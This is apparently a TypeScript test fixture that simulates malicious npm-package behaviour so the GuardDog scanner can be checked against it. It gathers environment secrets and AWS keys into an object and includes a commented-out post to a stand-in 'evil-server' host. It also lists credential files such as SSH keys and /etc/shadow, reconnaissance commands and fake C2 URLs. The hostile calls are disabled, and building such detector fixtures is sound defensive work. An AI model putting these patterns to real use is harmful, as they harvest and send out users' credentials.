import { exec } from 'child_process';
import * as fs from 'fs';
import axios from 'axios';
import * as crypto from 'crypto';

// This file contains patterns that should trigger GuardDog heuristics
// NOTE: This is for TESTING purposes only - do not use in production!

export class SuspiciousActivity {
  
  // Pattern that might trigger exec-base64 detection
  private executeEncodedCommand(encodedCmd: string): void {
    try {
      const decodedCmd = Buffer.from(encodedCmd, 'base64').toString('utf-8');
      console.log('Executing:', decodedCmd);
      // In a real malicious package, this might execute the command
      // exec(decodedCmd); // Commented out for safety
    } catch (error) {
      console.error('Failed to decode command:', error);
    }
  }

  // Pattern that might trigger environment variable exfiltration detection  
  async gatherSystemInfo(): Promise<void> {
    const sensitiveData = {
      environment: process.env,
      platform: process.platform,
      hostname: process.env.HOSTNAME || 'unknown',
      user: process.env.USER || process.env.USERNAME || 'unknown',
      home: process.env.HOME || process.env.USERPROFILE || 'unknown',
      path: process.env.PATH,
      // Potential secrets that might be in environment
      secrets: {
        apiKey: process.env.API_KEY,
        dbPassword: process.env.DB_PASSWORD,
        jwtSecret: process.env.JWT_SECRET,
        awsKey: process.env.AWS_ACCESS_KEY_ID,
        awsSecret: process.env.AWS_SECRET_ACCESS_KEY
      }
    };

    // This pattern might trigger exfiltration detection
    try {
      console.log('System info gathered (not actually sent anywhere):');
      console.log('Environment variables count:', Object.keys(process.env).length);
      
      // In malicious code, this might send data to an external server
      // await axios.post('https://evil-server.example.com/collect', sensitiveData);
    } catch (error) {
      console.log('Data collection simulation failed:', error);
    }
  }

  // Pattern that might trigger file system access detection
  async accessSensitiveFiles(): Promise<void> {
    const sensitiveFiles = [
      '/etc/passwd',           // Linux password file
      '/etc/shadow',           // Linux shadow file  
      'C:\\Windows\\System32\\config\\SAM', // Windows password hashes
      process.env.HOME + '/.ssh/id_rsa',    // SSH private key
      process.env.HOME + '/.aws/credentials', // AWS credentials
      process.env.USERPROFILE + '\\.ssh\\id_rsa', // Windows SSH key
    ];

    for (const filePath of sensitiveFiles) {
      try {
        if (fs.existsSync(filePath)) {
          console.log(`Found sensitive file: ${filePath}`);
          // In malicious code, this might read and exfiltrate the file
          // const content = fs.readFileSync(filePath, 'utf8');
        }
      } catch (error) {
        // Silently continue (suspicious behavior)
      }
    }
  }

  // Pattern that might trigger shell execution detection
  executeSystemCommands(): void {
    const commands = [
      'whoami',
      'id',
      'uname -a',
      'systeminfo',
      'ipconfig',
      'ifconfig',
      'ps aux',
      'tasklist'
    ];

    commands.forEach(command => {
      try {
        console.log(`Would execute: ${command}`);
        // In malicious code, this would actually execute
        // exec(command, (error, stdout, stderr) => {
        //   if (stdout) console.log(stdout);
        // });
      } catch (error) {
        // Silently fail
      }
    });
  }

  // Pattern that might trigger network communication detection
  async communicateWithSuspiciousDomains(): Promise<void> {
    const suspiciousUrls = [
      'http://malware-c2.evil.com/checkin',
      'https://data-exfil.badsite.ru/upload',
      'http://crypto-miner.suspicious.tk/config',
      'https://keylogger.phishing.ml/logs'
    ];

    for (const url of suspiciousUrls) {
      try {
        console.log(`Would contact: ${url}`);
        // In malicious code, this might actually make requests
        // await axios.get(url, { timeout: 5000 });
      } catch (error) {
        // Silently continue
      }
    }
  }

  // Pattern that might trigger cryptographic activity detection
  performCryptoOperations(): void {
    try {
      // Generate suspicious crypto activity
      const key = crypto.randomBytes(32);
      const iv = crypto.randomBytes(16);
      
      const cipher = crypto.createCipher('aes-256-cbc', key);
      const decipher = crypto.createDecipher('aes-256-cbc', key);
      
      console.log('Crypto operations simulated');
      
      // Pattern that might look like ransomware preparation
      const testData = 'user_documents_and_files';
      let encrypted = cipher.update(testData, 'utf8', 'hex');
      encrypted += cipher.final('hex');
      
      console.log('Data encryption simulation completed');
    } catch (error) {
      console.error('Crypto operations failed:', error);
    }
  }

  // Initialize all suspicious activities (but safely)
  async runSuspiciousActivities(): Promise<void> {
    console.log('🚨 Running suspicious activity simulation (SAFE - for testing only)');
    
    this.executeEncodedCommand(Buffer.from('echo "This is a test"').toString('base64'));
    await this.gatherSystemInfo();
    await this.accessSensitiveFiles();
    this.executeSystemCommands();
    await this.communicateWithSuspiciousDomains();
    this.performCryptoOperations();
    
    console.log('✅ Suspicious activity simulation completed');
  }
}

// Export for potential use (but don't auto-execute)
export default SuspiciousActivity;